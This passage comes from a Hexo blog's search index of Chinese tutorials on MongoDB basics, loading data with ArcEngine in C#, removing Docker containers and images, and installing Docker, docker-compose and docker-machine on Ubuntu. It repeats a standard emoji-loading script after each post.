img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB初试及基本操作]]></title>
    <url>%2Fposts%2F28f19af%2F</url>
    <content type="text"><![CDATA[分布式：一个任务分成多个子任务完成 （副手） 集群：一个任务由多态服务器同时服务 大数据 文档结构，海量数据，大容量存储，高校存储大量二进制文件 场景： 1.需要不断扩容； 2.新应用，需求会变，数据模型无法确定； 3.高可用（不宕机） 4.需要整合多个外部数据源 SQL术语 MongoDB术语 解释说明 database database 数据库 table collection 数据库表/集合 row document 数据记录行/文档 column field 字段/域 index index 索引 table joins 表连接，MongoDB不支持 primary key primary key 主键，MongoDB自动将_id字段设置为主键 文档：就是一个对象，由键值对构成，是json的一种扩展 Bson形式 字段(域)之间可以是不同类型: {‘book’:’xxx’, ‘hero’:’yyy’}` {'name':'sjz', 'age':18} 下载完成后，将可执行文件添加到PATH路径中 export PATH=/user/local/mondodb/bin:$PATH 服务端mongod 配置文件位置 etc/mongod.conf 默认端口 27017 查看端口： ss -tnl 数据库服务启动/停止/重启 sudo service mongodb start/stop/restart 查看状态： sudo service mongodb status 客户端启动 mongo 连接mongodb: # 进入 mongo # 退出 exit 或者 ctrl + c 或 quit() 数据库级操作：1.查看所有数据库 show dbs 2.创建数据库 use mydb # 创建之后，如果不插入数据的话， show dbs是看不到刚建立的数据库的 3.显示当前数据库 db 4.删除数据库 db.dropDatabase() # 注意大小写 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngine"万能""加载数据方法]]></title>
    <url>%2Fposts%2Feb2e44a3%2F</url>
    <content type="text"><![CDATA[下面介绍一种“万能”加载数据的办法： // 加载很多种数据 ICommand command = new ControlsAddDataCommandClass(); command.OnCreate(mainMapControl.Object); command.OnClick(); mainMapControl.ActiveView.Refresh(); document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker删除镜像和容器]]></title>
    <url>%2Fposts%2F329caef9%2F</url>
    <content type="text"><![CDATA[先查看容器运行状态 docker ps -a 找到image对应的容器，先stop # id docker stop d751d48a6d0a 再删除容器 docker rm d751d48a6d0a 最后才能删除镜像 docker rmi fce289e99eb9 # 查看镜像，删除ok docker images 注：rm与rmi的区别rm Remove one or more containers rmi Remove one or more images document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker安装]]></title>
    <url>%2Fposts%2F327177db%2F</url>
    <content type="text"><![CDATA[docker：有两个版本:docker-ce(社区版)和docker-ee(企业版)。 笔者这里介绍安装或升级的是最新版docker-ce(社区版)。 参考官网地址：https://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/#os-requirements docker-compse：可运行和管理多个docker容器。 docker-machine：docker官方提供的docker管理工具。可管理多个docker主机，可搭建swarm集群。 一、docker安装1，卸载旧版本docker 全新安装时，无需执行该步骤 $ sudo apt-get remove docker docker-engine docker.io 2，更新系统软件 $ sudo apt-get update 3，安装依赖包 $ sudo apt-get install \ apt-transport-https \ ca-certificates \ curl \ software-properties-common 4，添加官方密钥 执行该命令时，如遇到长时间没有响应说明网络连接不到docker网站，需要使用代-理进行。 $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 显示OK,表示添加成功. 5，添加仓库 $ sudo add-apt-repository \ "deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable" 6，再次更新软件 经实践，这一步不能够省略，我们需要再次把软件更新到最新，否则下一步有可能会报错。 $ sudo apt-get update 7，安装docker 如果想指定安装某一版本，可使用 sudo apt-get install docker-ce= 命令，把替换为具体版本即可。 以下命令没有指定版本，默认就会安装最新版 $ sudo apt-get install docker-ce 8，查看docker版本 $ docker -v 显示“Docker version 17.09.0-ce, build afdb6d4”字样，表示安装成功。 二、docker-compose安装1，下载docker-compose $ sudo curl -L https://github.com/docker/compose/releases/download/1.17.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose 2，授权 $ sudo chmod +x /usr/local/bin/docker-compose 3，查看版本信息 $ docker-compose --version 显示出版本信息，即安装成功。 三、docker-machine安装说明：docker-machine的使用是要基于virtualBox的。如果没有安装安装过，请先安装virtualBox。 1，安装virtualBox 登录virtualBox官网：https://www.virtualbox.org/wiki/Linux_Downloads 找到”Ubuntu 16.04 (“Xenial”) i386 | AMD64”字样，点击“AMD64”进行下载。 下载后，执行以下命令进行安装： $ sudo dpkg -i virtualbox-5.2_5.2.0-118431_Ubuntu_xenial_amd64.deb 2，下载并安装docker-machine $ curl -L https://github.com/docker/machine/releases/download/v0.13.0/docker-machine-`uname -s`-`uname -m` &gt;/tmp/docker-machine &amp;&amp; chmod +x /tmp/docker-machine &amp;&amp; sudo cp /tmp/docker-machine /usr/local/bin/docker-machine 3，查看版本信息 $ docker-machine version 显示出版本信息，即安装成功。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
</search>
